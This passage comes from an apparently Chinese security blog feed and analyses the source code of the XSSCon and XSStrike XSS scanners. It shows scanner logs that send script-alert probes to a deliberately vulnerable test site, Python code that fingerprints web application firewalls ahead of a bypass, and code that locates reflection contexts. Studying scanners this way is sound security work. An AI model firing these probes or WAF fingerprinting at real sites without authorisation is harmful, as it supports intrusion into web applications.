class="line">[16:20:39] [INFO] Checking connection to: http://testphp.vulnweb.com/categories.php</span><br><span class="line">[16:20:40] [INFO] Connection estabilished 200</span><br><span class="line">[16:20:40] [WARNING] Target have form with POST method: http://testphp.vulnweb.com/search.php?test=query</span><br><span class="line">[16:20:40] [INFO] Collecting form input key.....</span><br><span class="line">[16:20:40] [INFO] Form key name: searchFor value: &lt;script&gt;alert(6000/3000)&lt;/script&gt;</span><br><span class="line">[16:20:40] [INFO] Form key name: goButton value: &lt;Submit Confirm&gt;</span><br><span class="line">[16:20:40] [INFO] Sending payload (POST) method...</span><br><span class="line">[16:20:41] [CRITICAL] Detected XSS (POST) at http://testphp.vulnweb.com/search.php?test=query</span><br><span class="line">[16:20:41] [CRITICAL] Post data: &#123;&#x27;searchFor&#x27;: &#x27;&lt;script&gt;alert(6000/3000)&lt;/script&gt;&#x27;, &#x27;goButton&#x27;: &#x27;goButton&#x27;&#125;</span><br><span class="line">[16:20:41] [WARNING] Found link with query: cat=1 Maybe a vuln XSS point</span><br><span class="line">[16:20:41] [INFO] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=&lt;script&gt;alert(6000/3000)&lt;/script&gt;</span><br><span class="line">[16:20:41] [INFO] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert%286000%2F3000%29%3C%2Fscript%3E</span><br><span class="line">[16:20:42] [CRITICAL] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert(6000/3000)%3C/script%3E</span><br><span class="line">[16:20:42] [WARNING] Found link with query: cat=2 Maybe a vuln XSS point</span><br><span class="line">[16:20:42] [INFO] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=&lt;script&gt;alert(6000/3000)&lt;/script&gt;</span><br><span class="line">[16:20:42] [INFO] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert%286000%2F3000%29%3C%2Fscript%3E</span><br><span class="line">[16:20:42] [CRITICAL] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert(6000/3000)%3C/script%3E</span><br><span class="line">[16:20:42] [WARNING] Found link with query: cat=3 Maybe a vuln XSS point</span><br><span class="line">[16:20:42] [INFO] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=&lt;script&gt;alert(6000/3000)&lt;/script&gt;</span><br><span class="line">[16:20:42] [INFO] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert%286000%2F3000%29%3C%2Fscript%3E</span><br><span class="line">[16:20:43] [CRITICAL] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert(6000/3000)%3C/script%3E</span><br><span class="line">[16:20:43] [WARNING] Found link with query: cat=4 Maybe a vuln XSS point</span><br><span class="line">[16:20:43] [INFO] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=&lt;script&gt;alert(6000/3000)&lt;/script&gt;</span><br><span class="line">[16:20:43] [INFO] Query (GET) : http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert%286000%2F3000%29%3C%2Fscript%3E</span><br><span class="line">[16:20:43] [CRITICAL] Detected XSS (GET) at http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert(6000/3000)%3C/script%3E</span><br><span class="line">***************</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>省略了很多,通过输出可以大致了解一下他的流程。。</p>
<hr />
<h1>搭建靶机环境:</h1>
<p>phpstudy + xss练习平台代码. 方便调试…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.107/xss/level2.php</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/07/08/5d2329cfae51367657.png" alt="" /></p>
<hr />
<h1>主要流程:</h1>
<h2 id="命令行参数解析">命令行参数解析:</h2>
<p><img src="https://i.loli.net/2019/07/09/5d24ab505d76037106.png" alt="" /></p>
<p>都是常规的一些参数,所以就略过.</p>
<p>可以看到里面含cralwer参数,可见是个带有爬虫功能的主动发包的scanner.</p>
<hr />
<h2 id="检查可用性">检查可用性:</h2>
<p><img src="https://i.loli.net/2019/07/09/5d24ac9d8fc6950212.png" alt="" /></p>
<p>在开始探测之前,会检查一下该url的&quot;连通性&quot;.</p>
<p>作者本意是通过返回包的状态码<code>status_code</code>,认为大于400就是&quot;连接失败&quot;.</p>
<p>这里用<code>connection</code>应该是不准确的.</p>
<p><strong>有任一状态码都认为是服务器有回复,即是连通的.<br />
连通性有问题的话,应该是请求超时,服务器无响应.</strong></p>
<p>所以,这里我觉得是检查该探测行为(xss检测)情况下,这个url的可用性.</p>
<p>xss检测的话,只要能正常访问页面,状态码是2xx或者3xx都是ok的.</p>
<p>而检测服务器报错的时候,状态码是5xx也是ok的。</p>
<p>检测服务器报错的时候常常是构造异常的url(数据包),服务器无法正常处理,然后报错,可能会把报错信息输出在页面上.</p>
<p>这种情况下,状态码一般都是<code>5xx</code>(大于400),那么是这个时候服务器是有响应的,有处理你的请求的,不能认为是连通性有问题.</p>
<p><strong>不同检测方式,判定url的可用性应该是不一样的</strong>。</p>
<hr />
<h2 id="三类请求的检测">三类请求的检测:</h2>
<h3 id="get-method">get_method:</h3>
<p>形式:get方法提交的键值对参数</p>
<p>例如:<code>xxx.com/index.php?id=1</code></p>
<p><img src="https://i.loli.net/2019/07/09/5d24b236456b846479.png" alt="" /></p>
<p><img src="https://i.loli.net/2019/07/09/5d24b1cd0761e69063.png" alt="" /></p>
<p>判断方式是看xss payload有没在返回包的源码中,简单粗暴但容易误报.</p>
<p>这里面还有个细节就是发了两次请求包.</p>
<p>为什么要发两次请求包呢?要多发个<code>urlencode</code>后的包呢?</p>
<p>因为有些特殊的字符要<code>urlencode</code>之后,服务器才能正常正确的处理.例如<code>&amp;</code>等.<br />
之前在写api的时候,试过<code>token</code>值里面带了<code>&amp;</code>这个符号后,api程序不能正常解析,认为这是个不合法的<code>token</code>.</p>
<blockquote>
<p>**HTTP协议中参数组件的传输是<code>key=value</code>键值对的形式，如果要传输多个参数就需要用<code>&amp;</code>符号对键值对进行分隔。**例如?name1=value1&amp;name2=$value2,这样在服务器收到这种字符串的时候，会用“&amp;”分隔出每一个参数，然后再用“=”来分隔出参数值。</p>
</blockquote>
<blockquote>
<p>如果我的参数值中就包含<code>=</code>或者<code>&amp;</code>这样的特殊子字符的时候，该怎么办。比如说<code>name1=value1</code>,其中value1的值是<code>va&amp;lu=e1</code>，那么在传输过程中就会变成<code>name1=va&amp;lu=e1</code>。<strong>用户传输的本意是只有一个键值对，但是服务器端会解析成两个键值对，这样就自然的产生了歧义。</strong></p>
</blockquote>
<blockquote>
<p>**URL编码只是简单的在特殊字符的各个字节（16进制）前加上<code>%</code>即可。**例如，我们对上述会产生歧义的字符进行编码后的结果：<code>name1=va%26lu%3D</code>，这样服务器会把紧跟在<code>%</code>后的字节当成普通的字节，不会把它当成各个参数或键值对的分隔符。</p>
</blockquote>
<hr />
<h3 id="get-method-form">get_method_form:</h3>
<p>form表单通过get方法提交.</p>
<p><img src="https://i.loli.net/2019/07/09/5d24b45770e6258699.png" alt="" /><br />
<img src="https://i.loli.net/2019/07/09/5d24b4881707412169.png" alt="" /></p>
<p>其中可以学到的点就是</p>
<p>构造请求包的思路:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>找到<code>form</code>标签</p>
</li>
<li class="lvl-2">
<p>找出<code>input</code>,<code>textarea</code>属性,解析参数值对</p>
</li>
</ul>
<hr />
<h3 id="post-method：">post_method：</h3>
<p>form表单通过post方法提交.</p>
<p><img src="https://i.loli.net/2019/07/09/5d24b528adc3c84990.png" alt="" /></p>
<p>这个大体跟<code>get_method_form</code>相似.略过</p>
<hr />
<h1>总结:</h1>
<p>这个xss scanner代码量很少,只能算个简单的黑盒静态检测Xss的scanner,容易误报.</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>代码虽少,但是可以通过这个工具简单的了解到一个黑盒静态检测的xss scanner是怎么写的,也是非常不错的哈哈哈.</p>
</li>
<li class="lvl-2">
<p><strong>不同检测方式,判定url的可用性应该是不一样的</strong>。</p>
</li>
<li class="lvl-2">
<p><strong>有任一状态码都认为是服务器有回复,即是连通的.连通性有问题的话,应该是请求超时,服务器无响应.</strong></p>
</li>
<li class="lvl-2">
<p>**HTTP协议中参数组件的传输是<code>key=value</code>键值对的形式，如果要传输多个参数就需要用<code>&amp;</code>符号对键值对进行分隔。**如果参数值中就包含<code>=</code>或者<code>&amp;</code>这样的特殊子字符的时候，**用户传输的本意是只有一个键值对，但是服务器端会解析成两个键值对，这样就自然的产生了歧义。**这个时候就要用URL编码,<strong>URL编码只是简单的在特殊字符的各个字节（16进制）前加上<code>%</code>即可。</strong></p>
</li>
</ul>
<blockquote>
<p>含注释的代码在<code>https://github.com/jerrychan807/XSSCon/tree/comment</code></p>
</blockquote>
<hr />
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.cnblogs.com/jerrysion/p/5522673.html">为什么要进行URL编码</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/menkrep1337/XSSCon">XSSCon</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SourceCodeReading</category>
      </categories>
      <tags>
        <tag>SourceCodeReading</tag>
      </tags>
  </entry>
  <entry>
    <title>XSStrike源码-waf检测</title>
    <url>/2019/39308.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<blockquote>
<p>waf检测是为了之后的bypass.</p>
</blockquote>
<hr />
<h1>源码:</h1>
<p>该功能比较简单,所以直接贴源码.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> core.requester <span class="keyword">import</span> requester</span><br><span class="line"><span class="keyword">from</span> core.log <span class="keyword">import</span> setup_logger</span><br><span class="line"></span><br><span class="line">logger = setup_logger(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wafDetector</span>(<span class="params">url, params, headers, GET, delay, timeout</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(sys.path[<span class="number">0</span>] + <span class="string">&#x27;/db/wafSignatures.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        wafSignatures = json.load(file)</span><br><span class="line">    <span class="comment"># a payload which is noisy enough to provoke the WAF</span></span><br><span class="line">    noise = <span class="string">&#x27;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#x27;</span> <span class="comment"># 明显的payload</span></span><br><span class="line">    params[<span class="string">&#x27;xss&#x27;</span>] = noise</span><br><span class="line">    <span class="comment"># Opens the noise injected payload</span></span><br><span class="line">    response = requester(url, params, headers, GET, delay, timeout)</span><br><span class="line">    page = response.text <span class="comment"># 返回包源码</span></span><br><span class="line">    code = <span class="built_in">str</span>(response.status_code) <span class="comment"># 状态码</span></span><br><span class="line">    headers = <span class="built_in">str</span>(response.headers) <span class="comment"># 头部</span></span><br><span class="line">    logger.debug(<span class="string">&#x27;Waf Detector code: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(code))</span><br><span class="line">    logger.debug_json(<span class="string">&#x27;Waf Detector headers:&#x27;</span>, response.headers)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(code) &gt;= <span class="number">400</span>:</span><br><span class="line">        bestMatch = [<span class="number">0</span>, <span class="literal">None</span>]</span><br><span class="line">        <span class="keyword">for</span> wafName, wafSignature <span class="keyword">in</span> wafSignatures.items():</span><br><span class="line">            score = <span class="number">0</span></span><br><span class="line">            pageSign = wafSignature[<span class="string">&#x27;page&#x27;</span>]</span><br><span class="line">            codeSign = wafSignature[<span class="string">&#x27;code&#x27;</span>]</span><br><span class="line">            headersSign = wafSignature[<span class="string">&#x27;headers&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> pageSign:</span><br><span class="line">                <span class="keyword">if</span> re.search(pageSign, page, re.I):</span><br><span class="line">                    score += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> codeSign:</span><br><span class="line">                <span class="keyword">if</span> re.search(codeSign, code, re.I):</span><br><span class="line">                    score += <span class="number">0.5</span>  <span class="comment"># increase the overall score by a smaller amount because http codes aren&#x27;t strong indicators         # 状态码权重较低,因为不是一个特别准确的判断标识</span></span><br><span class="line">            <span class="keyword">if</span> headersSign:</span><br><span class="line">                <span class="keyword">if</span> re.search(headersSign, headers, re.I):</span><br><span class="line">                    score += <span class="number">1</span></span><br><span class="line">            <span class="comment"># if the overall score of the waf is higher than the previous one</span></span><br><span class="line">            <span class="keyword">if</span> score &gt; bestMatch[<span class="number">0</span>]: <span class="comment"># 保留权重最高的</span></span><br><span class="line">                <span class="keyword">del</span> bestMatch[:]  <span class="comment"># delete the previous one</span></span><br><span class="line">                bestMatch.extend([score, wafName])  <span class="comment"># and add this one</span></span><br><span class="line">        <span class="keyword">if</span> bestMatch[<span class="number">0</span>] != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> bestMatch[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>
<hr />
<h1>主要流程</h1>
<h2 id="发送明显的恶意payload">发送明显的恶意payload:</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># a payload which is noisy enough to provoke the WAF</span></span><br><span class="line">noise = <span class="string">&#x27;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#x27;</span> <span class="comment"># 明显的payload</span></span><br><span class="line">params[<span class="string">&#x27;xss&#x27;</span>] = noise</span><br><span class="line"><span class="comment"># Opens the noise injected payload</span></span><br><span class="line">response = requester(url, params, headers, GET, delay, timeout)</span><br></pre></td></tr></table></figure>
<p>发送一段足够明显的xss payload,连参数名都是<code>xss</code>,试图触发server的waf机制.</p>
<hr />
<h2 id="判断逻辑">判断逻辑:</h2>
<p>通过3个指标来<strong>正则匹配</strong>并计算匹配度得分,然后保留一个得分最高的作为最终的判定结果</p>
<ol>
<li class="lvl-3">
<p><strong>page 返回包源码</strong></p>
</li>
<li class="lvl-3">
<p><strong>code 状态码</strong></p>
</li>
<li class="lvl-3">
<p><strong>headers 返回包头部</strong></p>
</li>
</ol>
<hr />
<h3 id="正则匹配-2">正则匹配:</h3>
<p>目前这个版本有66种waf的指纹、特征.</p>
<p>详细请看.<code>https://github.com/s0md3v/XSStrike/blob/470f138db5fc0943e8a90a0de4052ddb7c03efab/db/wafSignatures.json</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;360 Web Application Firewall (360)&quot;</span> : &#123;</span><br><span class="line">		<span class="string">&quot;code&quot;</span> : <span class="string">&quot;493&quot;</span>,</span><br><span class="line">		<span class="string">&quot;page&quot;</span> : <span class="string">&quot;/wzws-waf-cgi/&quot;</span>,</span><br><span class="line">		<span class="string">&quot;headers&quot;</span> : <span class="string">&quot;X-Powered-By-360wzb&quot;</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="string">&quot;aeSecure&quot;</span> : &#123;</span><br><span class="line">		<span class="string">&quot;code&quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		<span class="string">&quot;page&quot;</span> : <span class="string">&quot;aesecure_denied.png&quot;</span>,</span><br><span class="line">		<span class="string">&quot;headers&quot;</span> : <span class="string">&quot;aeSecure-code&quot;</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="string">&quot;Airlock (Phion/Ergon)&quot;</span> : &#123;</span><br><span class="line">		<span class="string">&quot;code&quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		<span class="string">&quot;page&quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		<span class="string">&quot;headers&quot;</span> : <span class="string">&quot;AL[_-]?(SESS|LB)&quot;</span></span><br><span class="line">	&#125;,</span><br><span class="line">	.... 省略</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr />
<h3 id="计算匹配度分数">计算匹配度分数:</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> pageSign:</span><br><span class="line">    <span class="keyword">if</span> re.search(pageSign, page, re.I):</span><br><span class="line">        score += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> codeSign:</span><br><span class="line">    <span class="keyword">if</span> re.search(codeSign, code, re.I):</span><br><span class="line">        score += <span class="number">0.5</span>  <span class="comment"># increase the overall score by a smaller amount because http codes aren&#x27;t strong indicators         # 状态码权重较低,因为不是一个特别准确的判断标识</span></span><br><span class="line"><span class="keyword">if</span> headersSign:</span><br><span class="line">    <span class="keyword">if</span> re.search(headersSign, headers, re.I):</span><br><span class="line">        score += <span class="number">1</span></span><br><span class="line"><span class="comment"># if the overall score of the waf is higher than the previous one</span></span><br><span class="line"><span class="keyword">if</span> score &gt; bestMatch[<span class="number">0</span>]: <span class="comment"># 保留权重最高的</span></span><br><span class="line">    <span class="keyword">del</span> bestMatch[:]  <span class="comment"># delete the previous one</span></span><br><span class="line">    bestMatch.extend([score, wafName])  <span class="comment"># and add this one</span></span><br></pre></td></tr></table></figure>
<p>分别在返回包源码,状态码,返回包头部里正则匹配.</p>
<p>其中状态码的得分(权重)最低,因为状态码不是一个特别准确的判断标识</p>
<p>然后保留一个得分最高的,作为最终结果.</p>
<hr />
]]></content>
      <categories>
        <category>SourceCodeReading</category>
      </categories>
      <tags>
        <tag>SourceCodeReading</tag>
      </tags>
  </entry>
  <entry>
    <title>XSStrike源码-潜在注入点检测</title>
    <url>/2019/53126.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<hr />
<h1>潜在注入点检测:</h1>
<blockquote>
<p>潜在注入的检测是<strong>判断输入点是否可以成功把数据注入到页面内容</strong></p>
<p>对于提交数据内容但是不输出到页面的输入点是没有必要进行Fuzzing的，因为即使可以提交攻击代码，也不会产生XSS；</p>
<p><strong>在潜在注入点的检测通常使用的是一个随机字符串</strong>，比如随机6位数字，再判断这6位数字是否返回输出在页面，以此来进行判断。</p>
<p>为什么不直接使用Payload进行判断呢？</p>
<p>因为Payload里包含了攻击代码，通常很多应用都有防火墙或者过滤机制，Payload中的关键词会被拦截导致提交失败或者不会返回输出在页面，但这种情况不代表不能XSS，因为有可能只是Payload不够好，没有绕过过滤或者其他安全机制</p>
<p><strong>所以采用无害的随机数字字符就可以避免这种情况产生，先验证可注入，再调整Payload去绕过过滤；而随机的目的在于不希望固定字符成为XSS防御黑名单里的关键词</strong>。</p>
<p>— <a href="https://juejin.im/entry/58f43b0c61ff4b0058fd734d">跨站的艺术 - XSS Fuzzing 的技巧</a></p>
</blockquote>
<hr />
<h1>流程:</h1>
<h2 id="无害字符串替换">无害字符串替换:</h2>
<p>XSStrike采用的方式是用了作者自己的名字来作为特殊字符串.</p>
<blockquote>
<p>也相当于作者的一个banner信息…</p>
</blockquote>
<p><img src="https://i.loli.net/2019/07/16/5d2ca9b1c1b5d72584.png" alt="" /></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>以<code>v3dm0s</code>去替换参数值</p>
</li>
<li class="lvl-2">
<p>发包请求,在返回包源码中搜索<code>v3dm0s</code></p>
</li>
<li class="lvl-2">
<p>如果搜到多个地方有,那么说明可能存在多个输出点</p>
</li>
</ul>
<hr />
<h3 id="示例">示例:</h3>
<p>有一个初始请求url:<code>http://192.168.0.104/xss/level1.php?name=test</code></p>
<p>将参数值<code>test</code>替换成<code>v3dm0s</code></p>
<p>替换后的请求url:<code>http://192.168.0.104/xss/level1.php?name=v3dm0s</code></p>
<p><img src="https://i.loli.net/2019/07/16/5d2caafb10c1587305.png" alt="" /></p>
<p>那么说明这个页面有一个输出点.</p>
<hr />
<h3 id="实现代码">实现代码:</h3>
<p><img src="https://i.loli.net/2019/07/14/5d2b3fccaa40267676.png" alt="" /></p>
<p>在解析完参数的前提下,进行替换.<br />
然后调用<code>htmlParser</code>从返回包原文解析潜在注入点(输出点)的上下文环境.</p>
<hr />
<h2 id="解析输出点的上下文环境">解析输出点的上下文环境:</h2>
<p>每个输出点的环境都作为一个字典<code>occurences</code>存储.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="number">455</span>: &#123;<span class="string">&#x27;position&#x27;</span>: <span class="number">455</span>, <span class="string">&#x27;context&#x27;</span>: <span class="string">&#x27;attribute&#x27;</span>, <span class="string">&#x27;details&#x27;</span>: &#123;<span class="string">&#x27;tag&#x27;</span>: <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;quote&#x27;</span>: <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;v3dm0s&#x27;</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;value&#x27;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>position</code>:表示输出点在页面中的第几个字符处</p>
</li>
<li class="lvl-2">
<p><code>context</code>: 输出位置点的执行环境(<code>script</code>,<code>attribute</code>,<code>html</code>,<code>comment</code>等)</p>
</li>
<li class="lvl-2">
<p><code>details</code>: 执行环境的具体信息</p>
<ul class="lvl-2">
<li class="lvl-6"><code>tag</code>: 输出点在什么标签(<code>div</code>,<code>a</code>,<code>input</code>等)</li>
<li class="lvl-6"><code>type</code>: 输出点是参数名还是参数值(<code>name</code>, <code>value</code>)</li>
<li class="lvl-6"><code>quote</code>: 输出点是用什么包裹起来的(单引号,双引号,`号)</li>
<li class="lvl-6"><code>value</code>: 参数值</li>
<li class="lvl-6"><code>name</code>: 参数名</li>
</ul>
</li>
</ul>
<hr />
<h3 id="输出点在script标签中">输出点在script标签中:</h3>
<h4 id="示例-2">示例:</h4>
<p><img src="https://i.loli.net/2019/07/26/5d3a726768a9a13593.png" alt="" /></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(reflections):  <span class="comment"># 遍历输出点</span></span><br><span class="line">    occurence = re.search(<span class="string">r&#x27;(?i)(?s)&lt;script[^&gt;]*&gt;.*?(%s).*?&lt;/script&gt;&#x27;</span> % xsschecker, script_checkable)</span><br><span class="line">    <span class="comment"># 1.判断xsschecker是否在script标签对里面</span></span><br><span class="line">    <span class="keyword">if</span> occurence:</span><br><span class="line">        thisPosition = occurence.start(<span class="number">1</span>) <span class="comment"># Return the index of the start of the substring matched by group.</span></span><br><span class="line">        <span class="comment"># 2.返回注入点在返回包原文的位置</span></span><br><span class="line">        position_and_context[thisPosition] = <span class="string">&#x27;script&#x27;</span>  <span class="comment"># script标签</span></span><br><span class="line">        environment_details[thisPosition] = &#123;&#125;</span><br><span class="line">        environment_details[thisPosition][<span class="string">&#x27;details&#x27;</span>] = &#123;<span class="string">&#x27;quote&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;￥￥￥￥￥￥￥￥￥￥￥&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(occurence.group())  <span class="comment"># eq: &lt;script&gt;v3dm0s&lt;/script&gt;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;￥￥￥￥￥￥￥￥￥￥￥&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(occurence.group())):   <span class="comment"># eq: &lt;script&gt;v3dm0s&lt;/script&gt; 3.遍历每一个字符 判断输出点是由什么包裹起来的</span></span><br><span class="line">            currentChar = occurence.group()[i]</span><br><span class="line">            <span class="keyword">if</span> currentChar <span class="keyword">in</span> (<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>) <span class="keyword">and</span> <span class="keyword">not</span> escaped(i, occurence.group()):  <span class="comment">#  在(单引号,双引号,顿号)里  且未被转义</span></span><br><span class="line">                environment_details[thisPosition][<span class="string">&#x27;details&#x27;</span>][<span class="string">&#x27;quote&#x27;</span>] = currentChar</span><br><span class="line">            <span class="keyword">elif</span> currentChar <span class="keyword">in</span> (<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>) <span class="keyword">and</span> <span class="keyword">not</span> escaped(i, occurence.group()):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        script_checkable = script_checkable.replace(xsschecker, <span class="string">&#x27;&#x27;</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<hr />
<h4 id="小结-4">小结:</h4>
<p>主要做的就是:</p>
<ol>
<li class="lvl-3">
<p>判断输出点是否在script标签对里面</p>
</li>
<li class="lvl-3">
<p>返回输出点在返回包原文的位置</p>
</li>
<li class="lvl-3">
<p>判断输出点是用什么包裹起来的(单引号,双引号,`号)</p>
</li>
</ol>
<hr />
<h3 id="输出点在属性中">输出点在属性中:</h3>
<h4 id="示例-3">示例:</h4>
<p><img src="https://i.loli.net/2019/07/16/5d2ca3e0cec2634464.png" alt="" /></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(position_and_context) &lt; reflections:</span><br><span class="line">    attribute_context = re.finditer(<span class="string">r&#x27;&lt;[^&gt;]*?(%s)[^&gt;]*?&gt;&#x27;</span> % xsschecker, clean_response) <span class="comment"># 1.找出xsschecker所在的标签</span></span><br><span class="line">    <span class="keyword">for</span> occurence <span class="keyword">in</span> attribute_context:</span><br><span class="line">        match = occurence.group(<span class="number">0</span>) <span class="comment"># eq: match: &#x27;&lt;input name=keyword  value=&quot;v3dm0s&quot;&gt;&#x27;</span></span><br><span class="line">        thisPosition = occurence.start(<span class="number">1</span>)</span><br><span class="line">        parts = re.split(<span class="string">r&#x27;\s&#x27;</span>, match) <span class="comment"># eq: parts: &#x27;&lt;class &#x27;list&#x27;&gt;: [&#x27;&lt;input&#x27;, &#x27;name=keyword&#x27;, &#x27;&#x27;, &#x27;value=&quot;v3dm0s&quot;&gt;&#x27;]&#x27;</span></span><br><span class="line">        tag = parts[<span class="number">0</span>][<span class="number">1</span>:] <span class="comment"># tag: &#x27;input&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> part <span class="keyword">in</span> parts:</span><br><span class="line">            <span class="keyword">if</span> xsschecker <span class="keyword">in</span> part: <span class="comment"># xsschecker参数所在的部分</span></span><br><span class="line">                <span class="type">Type</span>, quote, name, value = <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;=&#x27;</span> <span class="keyword">in</span> part:</span><br><span class="line">                    quote = re.search(<span class="string">r&#x27;=([\&#x27;`&quot;])?&#x27;</span>, part).group(<span class="number">1</span>) <span class="comment"># 由什么包裹</span></span><br><span class="line">                    name_and_value = part.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>], <span class="string">&#x27;=&#x27;</span>.join(part.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>:])</span><br><span class="line">                    <span class="keyword">if</span> xsschecker == name_and_value[<span class="number">0</span>]: <span class="comment"># 注入点的类型是什么?</span></span><br><span class="line">                        <span class="type">Type</span> = <span class="string">&#x27;name&#x27;</span> <span class="comment"># 注入点的类型是参数名</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="type">Type</span> = <span class="string">&#x27;value&#x27;</span> <span class="comment"># 注入点的类型是参数值</span></span><br><span class="line">                    name = name_and_value[<span class="number">0</span>]</span><br><span class="line">                    value = name_and_value[<span class="number">1</span>].rstrip(<span class="string">&#x27;&gt;&#x27;</span>).rstrip(quote).lstrip(quote)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="type">Type</span> = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">                position_and_context[thisPosition] = <span class="string">&#x27;attribute&#x27;</span>  <span class="comment"># 属性</span></span><br><span class="line">                environment_details[thisPosition] = &#123;&#125;</span><br><span class="line">                environment_details[thisPosition][<span class="string">&#x27;details&#x27;</span>] = &#123;<span class="string">&#x27;tag&#x27;</span>: tag, <span class="string">&#x27;type&#x27;</span>: <span class="type">Type</span>, <span class="string">&#x27;quote&#x27;</span>: quote,</span><br><span class="line">                                                                <span class="string">&#x27;value&#x27;</span>: value, <span class="string">&#x27;name&#x27;</span>: name&#125;</span><br><span class="line">                <span class="comment"># eq: &#123;&#x27;details&#x27;: &#123;&#x27;tag&#x27;: &#x27;input&#x27;, &#x27;type&#x27;: &#x27;value&#x27;, &#x27;quote&#x27;: &#x27;&quot;&#x27;, &#x27;value&#x27;: &#x27;v3dm0s&#x27;, &#x27;name&#x27;: &#x27;value&#x27;&#125;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr />
<h4 id="小结-5">小结:</h4>
<p>主要做的就是:</p>
<ol>
<li class="lvl-3">
